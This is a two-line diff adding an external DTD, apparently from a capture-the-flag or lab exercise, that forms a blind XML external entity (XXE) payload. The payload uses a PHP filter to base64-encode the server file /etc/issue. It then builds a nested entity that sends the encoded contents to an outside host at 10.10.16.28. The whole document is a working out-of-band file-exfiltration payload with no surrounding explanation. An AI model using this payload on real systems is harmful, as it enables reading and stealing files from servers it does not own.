@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/issue">
+<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://10.10.16.28/result?%payl;'>">
